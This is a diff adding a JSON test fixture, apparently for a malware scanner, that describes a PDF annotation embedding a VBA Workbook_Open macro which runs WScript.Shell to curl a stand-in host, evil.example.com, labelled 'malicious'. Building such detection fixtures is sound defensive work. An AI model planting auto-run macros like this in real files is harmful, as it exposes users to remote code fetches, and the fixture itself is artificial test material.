@@ -1,0 +1,15 @@
+{
+  "schema_version": "1.0.0",
+  "id": "exp::document-office::33::binary-variations::0",
+  "base_sample_id": "exp::document-office::33",
+  "generator_id": "binary-variations",
+  "generator_version": "1.0.0",
+  "seed": -1795142585,
+  "content": "{\n  \"format\": \"pdf\",\n  \"annotations\": [\n    {\n      \"type\": \"StrikeOut\",\n      \"contents\": \"Private Sub Workbook_Open()\\n  CreateObject(\\\"WScript.Shell\\\").Run \\\"curl http://evil.example.com/\\\"\\nEnd Sub\\n\",\n      \"page\": 1,\n      \"rect\": [\n        100,\n        700,\n        400,\n        720\n      ]\n    }\n  ]\n}",
+  "content_hash": "3cfa356e7f54c499764a6f92333616d962a4768564603164ab9c3c207b3e1c94",
+  "content_type": "text",
+  "expected_verdict": "malicious",
+  "expected_modules": [],
+  "variation_type": "binary:pdf-annotation",
+  "difficulty": "advanced"
+}
